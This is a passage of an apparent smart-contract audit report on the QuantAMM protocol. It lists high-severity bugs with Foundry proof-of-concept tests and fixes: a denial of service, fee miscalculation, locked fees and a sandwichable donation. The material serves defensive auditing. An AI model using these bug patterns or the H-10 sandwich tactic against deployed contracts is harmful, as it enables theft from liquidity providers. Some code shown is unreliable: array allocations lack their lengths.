                poolsFeeData[poolAddress][_to].push(feeDataArray[tokenIdIndex]);

                if (tokenIdIndex != feeDataArrayLength - 1) {
                    //Reordering the entire array could be expensive but it is the only way to keep true FILO
                    for (uint i = tokenIdIndex + 1; i < feeDataArrayLength; i++) {
                        delete feeDataArray[i - 1];
                        feeDataArray[i - 1] = feeDataArray[i];
                    }
                }

                delete feeDataArray[feeDataArrayLength - 1];
                feeDataArray.pop();
            }
        }
    }

```

## <a id='H-04'></a>H-04. Denial of service when calculating the new weights if the rule requires previous moving averages

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

When the rule requires the previous moving averages in `UpdateRule::CalculateNewWeights`, the `movingAverages[_pool]` array length is twice the number of assets. However, when unpacking it using the `QuantAMMStorage::_quantAMMUnpack128Array` function, the amount of data requested is the same as the number of assets, i.e, half of the original length, causing the process to revert with an array out-of-bounds access error.

This issue causes rules like `MinimumVarianceUpdateRule` to permanently revert.

## Vulnerability Details

[`QuantAMMStorage::_quantAMMUnpack128Array`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/QuantAMMStorage.sol#L335) function is used to unpack `n/2` 256 bit integers into `n` 128 bit integers (as stated in the natspec). By design, this function requires the target array to be exactly the same length as the source array before being packed, otherwise it will revert with an array out-of-bounds access error, as can be seen in the function code.

```solidity
> QuantAMMStorage.sol

    function _quantAMMUnpack128Array(
        int256[] memory _sourceArray,
        uint _targetArrayLength
    ) internal pure returns (int256[] memory targetArray) {
        require(_sourceArray.length * 2 >= _targetArrayLength, "SRC!=TGT");
        targetArray = new int256[](_targetArrayLength);
        uint targetIndex;
        uint sourceArrayLengthMinusOne = _sourceArray.length - 1;
        bool divisibleByTwo = _targetArrayLength % 2 == 0;

        // @audit - _sourceArray.length is the bound of the loop, wich means that all the elements in the source array must be unpacked,
        // i.e., the function does not admit to unpack less elements than the packed.
        // @audit note * - this can be seen as a design choice or as a bug, depending on the preferences of the protocol team.
        // In this report, given the function description this is considered a design choice and the issue is in the way the function is used.
@>      for (uint i; i < _sourceArray.length; ) {
            targetArray[targetIndex] = _sourceArray[i] >> 128;
            unchecked {
                ++targetIndex;
            }
            if ((!divisibleByTwo && i < sourceArrayLengthMinusOne) || divisibleByTwo) {
                targetArray[targetIndex] = int256(int128(_sourceArray[i]));
            }
            unchecked {
                ++i;
                ++targetIndex;
            }
        }

        if (!divisibleByTwo) {
            targetArray[_targetArrayLength - 1] = int256(int128(_sourceArray[sourceArrayLengthMinusOne]));
        }
    }

```

On the other hand, the [`UpdateRule::CalculateNewWeights`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/rules/UpdateRule.sol#L79) function is used to calculate the new weights of the pool. When previous data is required, the `movingAverages[_pool]` array length is twice the number of assets. This array is packed taking its full length (2 \* numberOfAssets), however it is unpacked as if its length were the same as the number of assets in the pool. In this case, the discrepancy between the packing and unpacking length causes the process to revert because the `QuantAMMStorage::_quantAMMUnpack128Array` function does not allow to unpack fewer elements than originally packed.

```solidity
> UpdateRule.sol

    function CalculateNewWeights(
        int256[] calldata _prevWeights,
        int256[] calldata _data,
        address _pool,
        int256[][] calldata _parameters,
        uint64[] calldata _lambdaStore,
        uint64 _epsilonMax,
        uint64 _absoluteWeightGuardRail
    ) external returns (int256[] memory updatedWeights) {
        require(msg.sender == updateWeightRunner, "UNAUTH_CALC");

        QuantAMMUpdateRuleLocals memory locals;

        locals.numberOfAssets = _prevWeights.length;
        locals.nMinusOne = locals.numberOfAssets - 1;
        locals.lambda = new int128[](_lambdaStore.length);

        for (locals.i; locals.i < locals.lambda.length; ) {
            locals.lambda[locals.i] = int128(uint128(_lambdaStore[locals.i]));
            unchecked {
                ++locals.i;
            }
        }

        locals.requiresPrevAverage = _requiresPrevMovingAverage() == REQ_PREV_MAVG_VAL;
        locals.intermediateMovingAverageStateLength = locals.numberOfAssets;

        if (locals.requiresPrevAverage) {
            unchecked {
@>[0]             locals.intermediateMovingAverageStateLength *= 2;
            }
        }

@>[1]   locals.currMovingAverage = new int256[]();
        locals.updatedMovingAverage = new int256[](locals.numberOfAssets);

        // @audit - if previous moving averages are required, length of this array is twice the number of assets [0]
@>[2]   locals.calculationMovingAverage = new int256[]();

        // @audit - In all cases locals.currMovingAverage array length is the same as the number of assets [1]
        // furthermore, the number of assets is passed as the parameter in the function
@>[3]   locals.currMovingAverage = _quantAMMUnpack128Array(movingAverages[_pool], locals.numberOfAssets);

        ... snip

        // @audit - if previous moving averages are required, movingAverages[_pool] array is filled by packing
        // the locals.calculationMovingAverage, which length is twice the number of assets [2].
        // As in all cases only locals.numberOfAssets is passed to the unpack function, the process will revert because of
        // the difference between the source and target arrays length
        if (locals.requiresPrevAverage) {
@>[4]       movingAverages[_pool] = _quantAMMPack128Array(locals.calculationMovingAverage);
        }

        QuantAMMPoolParameters memory poolParameters;
        poolParameters.lambda = locals.lambda;
        poolParameters.movingAverage = locals.calculationMovingAverage;
        poolParameters.pool = _pool;

        //calling the function in the derived contract specific to the specific rule
        locals.unGuardedUpdatedWeights = _getWeights(_prevWeights, _data, _parameters, poolParameters);

        //Guard weights is done in the base contract so regardless of the rule the logic will always be executed
        updatedWeights = _guardQuantAMMWeights(
            locals.unGuardedUpdatedWeights,
            _prevWeights,
            int128(uint128(_epsilonMax)),
            int128(uint128(_absoluteWeightGuardRail))
        );
    }

```

## Proof of concept

To reproduce the issue, it is possible to use the existent tests with slightly modifications. The steps to follow are:

1. Set the `UpdateRule::_requiresPrevMovingAverage` function to return 1, to indicate that previous moving averages are required
2. Take a test and make sure to call the `UpdateRule::CalculateNewWeights` function two times. This is important as in the first call all the initialized variables are 'adjusted' to guarantee everything works fine, but in the second time all of them are modified and become more 'realistic'.

### Step 1. Set the `UpdateRule::_requiresPrevMovingAverage` function to return 1

It is necessary to modify the [MockUpdateRule::\_requiresPrevMovingAverage](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/mock/mockRules/MockUpdateRule.sol#L40) function.

```diff
> MockUpdateRule.sol

    function _requiresPrevMovingAverage() internal pure virtual override returns (uint16) {
-        return 0;
+        return 1;
    }
```

\*\*\* Note. After this modification, the issue can be seen when executing the [`UpdateRule.t.sol::testUpdateRuleMovingAverageStorage`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/test/foundry/rules/UpdateRule.t.sol#L96) test. It will fail because of the same root cause explained in this report.

### Step 2. Take a test and make sure to call the `UpdateRule::CalculateNewWeights` function two times

Lets take the [`testUpdateRuleAuthCalc`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/test/foundry/rules/UpdateRule.t.sol#L37) test located in the `test/foundry/rules/UpdateRule.t.sol` file. After the call to the `CalculateNewWeights` function, add a second call to the same function and execute the test.

```diff
> UpdateRule.t.sol

    function testUpdateRuleAuthCalc() public {
        vm.startPrank(owner);
         // Define local variables for the parameters
        
        ...snip

        //does not revert
        updateRule.CalculateNewWeights(
        prevWeights,
        data,
        address(mockPool),
        parameters,
        lambdas,
        uint64(uint256(epsilonMax)),
        uint64(0.2e18));

        // @audit - the same parameters are ok
+       //does revert
+       updateRule.CalculateNewWeights(
+       prevWeights,
+       data,
+       address(mockPool),
+       parameters,
+       lambdas,
+       uint64(uint256(epsilonMax)),
+       uint64(0.2e18));

        vm.stopPrank();
    }
```

When executing the test, process will revert with the array out-of-bounds access error, causing a permanent denial of service.

## Impact

Impact: High

Likelihood: Medium

## Tools Used

Manual Review

## Recommendations

It is required to modify the `CalculateNewWeights` function to pack the correct array. As `movingAverages[_pool]` does not require to contain the previous values, a valid solution is the following:

```diff

> UpdateRule.sol

    function CalculateNewWeights(
        int256[] calldata _prevWeights,
        int256[] calldata _data,
        address _pool,
        int256[][] calldata _parameters,
        uint64[] calldata _lambdaStore,
        uint64 _epsilonMax,
        uint64 _absoluteWeightGuardRail
    ) external returns (int256[] memory updatedWeights) {
        require(msg.sender == updateWeightRunner, "UNAUTH_CALC");

        QuantAMMUpdateRuleLocals memory locals;

        locals.numberOfAssets = _prevWeights.length;
        locals.nMinusOne = locals.numberOfAssets - 1;
        locals.lambda = new int128[](_lambdaStore.length);

        ... snip

        //because of mixing of prev and current if the numassets is odd it is makes normal code unreadable to do inline
        //this means for rules requiring prev moving average there is an addition SSTORE and local packed array
        if (locals.requiresPrevAverage) {
-           movingAverages[_pool] = _quantAMMPack128Array(locals.calculationMovingAverage);
+           movingAverages[_pool] = _quantAMMPack128Array(locals.updatedMovingAverage);
        }

        QuantAMMPoolParameters memory poolParameters;
        poolParameters.lambda = locals.lambda;
        poolParameters.movingAverage = locals.calculationMovingAverage;
        poolParameters.pool = _pool;

        //calling the function in the derived contract specific to the specific rule
        locals.unGuardedUpdatedWeights = _getWeights(_prevWeights, _data, _parameters, poolParameters);

        //Guard weights is done in the base contract so regardless of the rule the logic will always be executed
        updatedWeights = _guardQuantAMMWeights(
            locals.unGuardedUpdatedWeights,
            _prevWeights,
            int128(uint128(_epsilonMax)),
            int128(uint128(_absoluteWeightGuardRail))
        );
    }

```

## <a id='H-05'></a>H-05. Loss of Fees for Router `UpliftOnlyExample` due to Division Rounding in Admin Fee Calculation, Causing Unfair Fee Distribution

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The audit identified a vulnerability in the `UpliftOnlyExample` contract where a division rounding in the admin fee calculation lead to significant precision loss, resulting in unfair fee distribution.

## Vulnerability Details

* Found in `pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol` at [Line 335](https://github.com/Cyfrin/2024-12-quantamm/blob/main/pkg/pool-hooks/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L335)

```solidity
293:    function onAfterSwap(
        ...
334:                if (quantAMMFeeTake > 0) {
335: =>                     uint256 adminFee = hookFee / (1e18 / quantAMMFeeTake);
336:                    ownerFee = hookFee - adminFee;
                    ...
349:    }
```

The root cause of the vulnerability is that the equation `adminFee = hookFee / (1e18 / quantAMMFeeTake)` takes advantage of the precision loss of integer division, where the denominator `1e18 / quantAMMFeeTake` rounds down significantly before the next division of `hookFee`, making the `adminFee` larger than expected.

Let's observe the following comparison table to see the impact of the rounding error:

| `quantAMMFeeTake`      | `adminFee`       | `expectedAdminFee` | `ownerFee`       | `expectedOwnerFee` | `router loss`     |
| ---------------------- | ---------------- | ------------------ | ---------------- | ------------------ | ----------------- |
| 0.1e18 (10%)           | 0.1 \* hookFee   | 0.1 \* hookFee     | 0.9 \* hookFee   | 0.9 \* hookFee     | 0                 |
| 0.2e18 (20%)           | 0.2 \* hookFee   | 0.2 \* hookFee     | 0.8 \* hookFee   | 0.8 \* hookFee     | 0                 |
| 0.3e18 (30%)           | 0.333 \* hookFee | 0.3 \* hookFee     | 0.667 \* hookFee | 0.7 \* hookFee     | 0.033 \* hookFee  |
| 0.4e18 (40%)           | 0.5 \* hookFee   | 0.4 \* hookFee     | 0.5 \* hookFee   | 0.6 \* hookFee     | 0.1 \* hookFee    |
| 0.5e18 (50%)           | 0.5 \* hookFee   | 0.5 \* hookFee     | 0.5 \* hookFee   | 0.5 \* hookFee     | 0                 |
| 0.5001e18 **(50.01%)** | 1 \* hookFee     | 0.5001 \* hookFee  | 0                | 0.4999 \* hookFee  | 0.4999 \* hookFee |
| 0.6e18 (60%)           | 1 \* hookFee     | 0.6 \* hookFee     | 0                | 0.4 \* hookFee     | 0.4 \* hookFee    |
| 0.7e18 (70%)           | 1 \* hookFee     | 0.7 \* hookFee     | 0                | 0.3 \* hookFee     | 0.3 \* hookFee    |
| 0.8e18 (80%)           | 1 \* hookFee     | 0.8 \* hookFee     | 0                | 0.2 \* hookFee     | 0.2 \* hookFee    |
| 0.9e18 (90%)           | 1 \* hookFee     | 0.9 \* hookFee     | 0                | 0.1 \* hookFee     | 0.1 \* hookFee    |
| 1.0e18 (100%)          | 1 \* hookFee     | 1.0 \* hookFee     | 0                | 0                  | 0                 |

### Key Notes:

1. `adminFee` values are calculated using `hookFee / (1e18 / quantAMMFeeTake)` and normalized where applicable.
2. `expectedAdminFee` is calculated using `hookFee * quantAMMFeeTake / 1e18`.
3. `ownerFee` is `hookFee - adminFee`.
4. `expectedOwnerFee` is `hookFee - expectedAdminFee`.

This clearly demonstrates how the incorrect formula causes inflated `adminFee` and diminished `ownerFee`, especially as `quantAMMFeeTake` starts to exceed 0.5e18 (50%). 

## Impact

The inability to accurately calculate the admin fee not only breaks the core functionality of the protocol's fee distribution, but also causes a significant loss for the router in terms of accrued fee incomes.

## Tools Used

Manual Review

## Recommendations

Consider using the normal practice of multiplying before division, such as&#x20;

```solidity
uint256 adminFee = hookFee * quantAMMFeeTake / 1e18;
```

to minimize precision loss and ensure fair fee distribution.

## <a id='H-06'></a>H-06. Owner fee will be locked in `UpliftOnlyExample` contract due to incorrect recipient address in `UpliftOnlyExample::onAfterSwap`

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

`UpliftOnlyExample::onAfterSwap` hook incorrectly transfers funds to `UpliftOnlyExample` contract instead of the owner address, coupled with a lack of withdrawal function in the `UpliftOnlyExample` contract, permanently locking the fees in the contract.

## Vulnerability Details

In [`UpliftOnlyExample::onAfterSwap`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L342-L345). The vault transfers funds to this contract instead of the owner address. This contract doesn't have any function to transfer out the funds, meaning all owner fees are permanently locked in this contract

```solidity
function onAfterSwap() {
...

if (ownerFee > 0) {
@>   _vault.sendTo(feeToken, address(this), ownerFee);
        emit SwapHookFeeCharged(address(this), feeToken, ownerFee);
   }
...
}
```

**Proof of Code**

Add this function to the `UpliftExample.t.sol`

```solidity
   function testSwapFeeLockedInHookContract() public {
        // 1. Set hook fee percentage
        uint64 hookFeePercentage = 1e16; // 1%
        vm.prank(owner);
        upliftOnlyRouter.setHookSwapFeePercentage(hookFeePercentage);

        // 2. Log initial balances
        console.log("--- Initial Balances ---");
        console.log("Hook Contract USDC Balance:", usdc.balanceOf(address(upliftOnlyRouter)));
        console.log("Owner USDC Balance:", usdc.balanceOf(owner));

        // 3. Perform swap to generate fees
        uint256 swapAmount = 100e18;
        vm.prank(bob);
        router.swapSingleTokenExactIn(address(pool), dai, usdc, swapAmount, 0, MAX_UINT256, false, bytes(""));

        // 4. Log final balances to show fees are stuck in hook
        console.log("\n--- After Swap Balances ---");
        console.log("Hook Contract USDC Balance:", usdc.balanceOf(address(upliftOnlyRouter)));
        console.log("Owner USDC Balance:", usdc.balanceOf(owner));

        console.log("\n--- Fees are locked in hook contract ---");
    }
```

```text
[PASS] testSwapFeeLockedInHookContract() (gas: 228556)
Logs:
--- Initial Balances ---
Hook Contract USDC Balance: 0
Owner USDC Balance: 0

--- After Swap Balances ---
Hook Contract USDC Balance: 1000000000000000000
Owner USDC Balance: 0
```

The test log indicates that the swap fees are sent to the `UpliftExample` contract. There is no function for transferring or donating the tokens, which leaves the funds locked in the contract.

## Impact

* `onAfterSwap` hook is called each time a user swaps tokens from the pool.
* Owner cannot access their entitled fees, resulting in direct financial loss

## Tools Used

* Manual
* Foundry

## Recommendations

Modify the `onAfterSwap` function to send the fees directly to the owner:

```diff
function onAfterSwap() {
...
- _vault.sendTo(feeToken, address(this), ownerFee)
+ _vault.sendTo(feeToken, owner(), ownerFee)
...
}
```

## <a id='H-07'></a>H-07. Missing Fee Normalization Leads to 1e18x Fee Overcharge in UpliftOnlyExample

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The `UpliftOnlyExample` contract contains a critical fee calculation error where fees are overcharged by a factor of 1e18 due to missing decimal normalization when calculating fees with `feePerLP`

## Vulnerability Details

```solidity
// In UpliftOnlyExample.sol

// Branch 1: When amount <= amountLeft
if (feeDataArray[i].amount <= localData.amountLeft) {
    uint256 depositAmount = feeDataArray[i].amount;
    localData.feeAmount += (depositAmount * feePerLP);  // @audit missing /1e18
    // ... rest of the code
} 
// Branch 2: When amount > amountLeft
else {
    localData.feeAmount += (feePerLP * localData.amountLeft);  // @audit missing /1e18
    // ... rest of the code
}
```

```solidity
     uint256 feePerLP;
            // if the pool has increased in value since the deposit, the fee is calculated based on the deposit value
            if (localData.lpTokenDepositValueChange > 0) {
                feePerLP =
                    (uint256(localData.lpTokenDepositValueChange) * (uint256(feeDataArray[i].upliftFeeBps) * 1e18)) /
                    10000;
            }
            // if the pool has decreased in value since the deposit, the fee is calculated based on the base value - see wp
            else {
                //in most cases this should be a normal swap fee amount.
                //there always myst be at least the swap fee amount to avoid deposit/withdraw attack surgace.
@>                feePerLP = (uint256(minWithdrawalFeeBps) * 1e18) / 10000;
            }

            // if the deposit is less than the amount left to burn, burn the whole deposit and move on to the next
            if (feeDataArray[i].amount <= localData.amountLeft) {
                uint256 depositAmount = feeDataArray[i].amount;
 @>               localData.feeAmount += (depositAmount * feePerLP);

                localData.amountLeft -= feeDataArray[i].amount;

                lpNFT.burn(feeDataArray[i].tokenID);

                delete feeDataArray[i];
                feeDataArray.pop();

                if (localData.amountLeft == 0) {
                    break;
                }
            } else {
                feeDataArray[i].amount -= localData.amountLeft;
@>                localData.feeAmount += (feePerLP * localData.amountLeft);
                break;
            }
        }
```

**Coded Scenario POC**

```solidity
// Given values:
feePerLP = 0.1e18;        // 10% fee (100000000000000000)
amount = 1000 tokens;
amountLeft = 2000 tokens;

// Case 1: amount <= amountLeft (1000 <= 2000)
depositAmount = 1000;
fee = depositAmount * feePerLP
    = 1000 * 100000000000000000
    = 100000000000000000000     // @audit 100e18 tokens instead of 100 tokens

// Case 2: amount > amountLeft
amountLeft = 500;
fee = feePerLP * amountLeft
    = 100000000000000000 * 500
    = 50000000000000000000      // @audit 50e18 tokens instead of 50 tokens

// Correct calculations should be:
correct_fee1 = (depositAmount * feePerLP) / 1e18
             = (1000 * 100000000000000000) / 1000000000000000000
             = 100 tokens                   // 10% of 1000

correct_fee2 = (feePerLP * amountLeft) / 1e18
             = (100000000000000000 * 500) / 1000000000000000000
             = 50 tokens                    // 10% of 500
```

## Impact

If transactions succeed, users lose significantly more funds than intended

## Tools Used

Chisel, Github

## Recommendations

```solidity
// Fix 1: Add 1e18 division in first branch
if (feeDataArray[i].amount <= localData.amountLeft) {
    uint256 depositAmount = feeDataArray[i].amount;
    localData.feeAmount += (depositAmount * feePerLP) / 1e18;  // @audit-ok added /1e18
    // ... rest of the code
}

// Fix 2: Add 1e18 division in else branch
else {
    localData.feeAmount += (feePerLP * localData.amountLeft) / 1e18;  // @audit-ok added /1e18
    // ... rest of the code
}
```

## <a id='H-08'></a>H-08. GradientBasedRules will not work for >=4 assets with vector lambdas

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

UpdateRules based on `GradientBasedRule`will revert/produce incorrect result when  if `numAssets >= `4 and `lambda.length > 1`. It's due to a simple mistake in updating `intermediateGradientStates`.

## Vulnerability Details

### Root Cause

We have the following in [`QuantammGradientBasedRule.sol:156`](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-quantamm/contracts/rules/base/QuantammGradientBasedRule.sol#L156-L159)

```Solidity
intermediateGradientStates[_poolParameters.pool][i] = _quantAMMPackTwo128( // @audit i should be replaced by locals.storageArrayIndex
    locals.intermediateGradientState[i],
    locals.secondIntermediateValue
);
unchecked {
    i += 2;
    ++locals.storageArrayIndex;
}
```

`IntermediateGradientStates` is a mapping to store quantum packed gradient values. If something is quantum packed, it means it will shrink rougly by half in size.

So `IntermediateGradientStates[pool].length <= ceil(numAssets / 2)`

In the above codebase, `i` is incrased up to `numAssets - 2`. So if `numAssets >= `4, `intermediateGradientStates[_poolParameters.pool][i]` will panic with array out of bound error (2 > 1)

**Indeed, `i` should be replaced by `locals.storageArrayIndex`**

PS: Interestingly, for numAssets = 5, array OOB error is not observed, because storage length is `ceil(5/2) = 3`and `i`is increased up to 3. So there won't be OOB error, but due to the wrong usage of storage index, intermediate values will be wrong.

### POC

Put the following content to `QuantAMMMomentum.sol` and run `forge test QuantAMMMomentum --match-test testRevertWithFourAssetsAndVectorLambdas -vvv`

```Solidity
function testRevertWithFourAssetsAndVectorLambdas() public {
    uint256 numAssets = 4;
    // Define local variables for the parameters
    int256[][] memory parameters = new int256[][]();
    parameters[0] = new int256[]();
    parameters[0][0] = PRBMathSD59x18.fromInt(1);
    parameters[1] = new int256[]();
    parameters[1][0] = PRBMathSD59x18.fromInt(1);
    parameters[2] = new int256[]();
    parameters[2][0] = PRBMathSD59x18.fromInt(1);
    parameters[3] = new int256[]();
    parameters[3][0] = PRBMathSD59x18.fromInt(1);

    int256[] memory previousAlphas = new int256[]();
    previousAlphas[0] = PRBMathSD59x18.fromInt(1);
    previousAlphas[1] = PRBMathSD59x18.fromInt(2);
    previousAlphas[2] = PRBMathSD59x18.fromInt(3);

    int256[] memory prevMovingAverages = new int256[]();

    int256[] memory movingAverages = new int256[]();
    movingAverages[0] = 0.9e18;

    int128[] memory lambdas = new int128[]();
    lambdas[0] = int128(0.7e18);
    lambdas[1] = int128(0.7e18);
    lambdas[2] = int128(0.7e18);
    lambdas[3] = int128(0.7e18);

    int256[] memory prevWeights = new int256[]();
    prevWeights[0] = 0.2e18;
    prevWeights[1] = 0.2e18;
    prevWeights[2] = 0.2e18;
    prevWeights[3] = 0.2e18;

    int256[] memory data = new int256[]();

    int256[] memory expectedResults = new int256[]();

    /**
     * vm.expectRevert doesn't work for internal test functions, so just copied runInitialUpdate and inserted vm.expectRevert
     */
    mockPool.setNumberOfAssets(numAssets);
    vm.startPrank(owner);
    rule.initialisePoolRuleIntermediateValues(address(mockPool), prevMovingAverages, previousAlphas, numAssets);
    vm.expectRevert(stdError.indexOOBError);
    rule.CalculateUnguardedWeights(prevWeights, data, address(mockPool), parameters, lambdas, movingAverages);
    vm.stopPrank();
}
```

## Impact

* All gradient based rules (Antimomentum, ChannelFollowing, DifferenceMomentum, PowerChannel etc) won't work with >=4 assets and lambdas parameters
  * If numAssets is 4, 6, 8, and lambdas.length > 1, update weights will revert with index out of bound error
  * For numAssets 5, 7 and lambdas.length > 1, weights calculation will be incorrect because wrong index is used for intermediate value storage

## Tools Used

Foundry

## Recommendations

Apply the following patch

```Solidity
diff --git a/pkg/pool-quantamm/contracts/rules/base/QuantammGradientBasedRule.sol b/pkg/pool-quantamm/contracts/rules/base/QuantammGradientBasedRule.sol
index e6bbcdc..f1f6d9f 100644
--- a/pkg/pool-quantamm/contracts/rules/base/QuantammGradientBasedRule.sol
+++ b/pkg/pool-quantamm/contracts/rules/base/QuantammGradientBasedRule.sol
@@ -153,7 +153,7 @@ abstract contract QuantAMMGradientBasedRule is ScalarRuleQuantAMMStorage {
 
                 locals.finalValues[locals.secondIndex] = locals.mulFactor.mul(locals.secondIntermediateValue);
 
-                intermediateGradientStates[_poolParameters.pool][i] = _quantAMMPackTwo128(
+                intermediateGradientStates[_poolParameters.pool][locals.storageArrayIndex] = _quantAMMPackTwo128(
                     locals.intermediateGradientState[i],
                     locals.secondIntermediateValue
                 );

```

## <a id='H-09'></a>H-09.  Locked Protocol Fees Due to Incorrect Fee Collection Method

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

In the `UpliftOnlyExample` contract, protocol fees that are collected during withdrawals may become permanently locked in the contract due to using `maxAmountsIn` instead of exact amounts in when minting BPT's for the admin. This leads to a loss of yield for the protocol as portions of collected fees become inaccessible.

## Vulnerability Details

The [issue](https://github.com/Cyfrin/2024-12-quantamm/blob/main/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L536-L544) occurs in the fee collection logic where `maxAmountsIn` is used with `localData.accruedQuantAMMFees`:

```solidity
maxAmountsIn: localData.accruedQuantAMMFees
```

When BPT's are minted for the admin during withdrawals, the full accrued fee amount is specified as a maximum input amount rather than specifying an exact input amount. Since the operation uses `AddLiquidityKind.PROPORTIONAL` which uses exact output amounts, this means an amount UP to the `accruedQuantAMMFees` will be used, but not necessarily the full amount. The net effect is:

1. The full fee amount is deducted from users during withdrawals
2. Only a portion of those fees may actually be transferred to the protocol
3. The unused portion remains locked in the contract with no mechanism to recover it

This creates a discrepancy where the users amount is reduced by `accruedQuantAMMFees` but the protocol mints BTPS's where the amounts in are <= `accruedQuantAMMFees`. In every case that the amount in is less than `accruedQuantAMMFees` the protocol will be left with a locked amount of fees that cannot be accessed.

Additionally:

 There is another issue with the current logic. The fix for the two is the same which is why I am mentioning both in this report. 

Due to the way `maxAmountsIn` is calculated there will be times it will be less then `amountInRaw`. When this happens the call will revert and throw the `AmountInAboveMax` error. This is detrimental to the protocol because this means that the users wont be able to remove liquidity if the amount they are removing is impacted by the rounding nature of the calculations that take place in this flow. The liquidity they wont be able to remove will be locked not because the size of there position is malicious but because the admin fee calculations are wrong and create impossible to satisfy slippage parameters. 

### PoC

In this PoC you will see that removing liquidity at times will revert when an admin fee exist. It seems this was not caught since admin fees were set to 0 in the test suite. But once set to even 5 basis points the issue presents itself. 

By running this test in `UpliftExample.t.sol` you will see a revert with the message:
```
[FAIL: AmountInAboveMax(0x2e234DAe75C793f67A35089C9d99245E1C58470b, 1, 0)]
```
It is important to note that I ran this test with some of the other fixes from my other issues implemented and the same revert exist just with more sensible numbers. 

```solidity
    function testFeeCalculationCausesRevert() public {
        vm.startPrank(address(vaultAdmin));
        updateWeightRunner.setQuantAMMSwapFeeTake(5); //set admin fee to 5 basis points (same as min withdrawal fee)
        vm.stopPrank();
        // Add liquidity so bob has BPT to remove liquidity.
        uint256[] memory maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)].toMemoryArray();
        vm.prank(bob);
        upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, bptAmount, false, bytes(""));
        vm.stopPrank();

        assertEq(upliftOnlyRouter.getUserPoolFeeData(pool, bob).length, 1, "bptAmount mapping should be 1");
        assertEq(upliftOnlyRouter.getUserPoolFeeData(pool, bob)[0].amount, bptAmount, "bptAmount mapping should be 0");
        assertEq(
            upliftOnlyRouter.getUserPoolFeeData(pool, bob)[0].blockTimestampDeposit,
            block.timestamp,
            "bptAmount mapping should be 0"
        );
        assertEq(
            upliftOnlyRouter.getUserPoolFeeData(pool, bob)[0].lpTokenDepositValue,
            500000000000000000,
            "should match sum(amount * price)"
        );
        assertEq(upliftOnlyRouter.getUserPoolFeeData(pool, bob)[0].upliftFeeBps, 200, "fee");

        int256[] memory prices = new int256[]();
        for (uint256 i = 0; i < tokens.length; ++i) {
            prices[i] = int256(i) * 1.5e18; // Make the price 1.5 times higher
        }
        updateWeightRunner.setMockPrices(pool, prices);

        uint256 nftTokenId = 0;
        uint256[] memory minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();

        BaseVaultTest.Balances memory balancesBefore = getBalances(bob);


        vm.startPrank(bob);
        upliftOnlyRouter.removeLiquidityProportional(bptAmount/3, minAmountsOut, false, pool);
        vm.stopPrank();

       
    }
```

## Impact
All in all these are two separate issues both of which with high severity however because it can be resolved with one fix as mentioned below I have this as a single high severity issue. 
Loss of yield and Locked funds - Protocol fees that are collected but not properly transferred become permanently locked in the contract, depriving the protocol of revenue it should have received.

## Tools Used

Manual Review

## Recommendations

Modify the logic to use exact input amounts instead of exact output amounts to ensure all collected fees are properly transferred to the protocol:

This ensures that:

1. The exact fee amount collected from users is transferred to the protocol
2. No fees remain trapped in the contract
3. The protocol receives all revenue it is entitled to
4. Positions wont become stuck due to bad slippage calculations. 

## <a id='H-10'></a>H-10. Donations are sanwichable to steal funds from LP

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Large Fees donations are sandwichable in `UpliftOnlyExample` stealing funds from the deserving actual LP providers

## Vulnerability Details

UpLift fees taken from `removeLiquidityProportional` during `onAfterRemoveLiquidity` are donated to the pool in stepwise matter,

```solidity
File: UpliftOnlyExample.sol
555:         if (localData.adminFeePercent != 1e18) {
556:             // Donates accrued fees back to LPs.
557:             _vault.addLiquidity(
558:                 AddLiquidityParams({
559:                     pool: localData.pool,
560:                     to: msg.sender, // It would mint BPTs to router, but it's a donation so no BPT is minted
561:                     maxAmountsIn: localData.accruedFees, // Donate all accrued fees back to the pool (i.e. to the LPs)
562:                     minBptAmountOut: 0, // Donation does not return BPTs, any number above 0 will revert
563:                     kind: AddLiquidityKind.DONATION,
564:                     userData: bytes("") // User data is not used by donation, so we can set it to an empty string
565:                 })
566:             );
567:         }
```

* This allow MEV (on L1) or racing txns to get those values that they don't deserve, basically stealing them from genuine LP providers, then immediately removing the liquidity after

An example of a whale removing liquidity with huge upLift fees donated:

1- Old whale in wETH-USDC Pool having his balance got upLifted 1000%

* from 2,500,000 USD/100wETH -> 25,000,000 USD/100wETH
* Total value in the Pool is 26,000,000 (whale has most of the pool)

2- `upliftFeeBps` is set to 5% \* 10 (value change) (11,500,000) as fees donated to a pool of 1,000,000

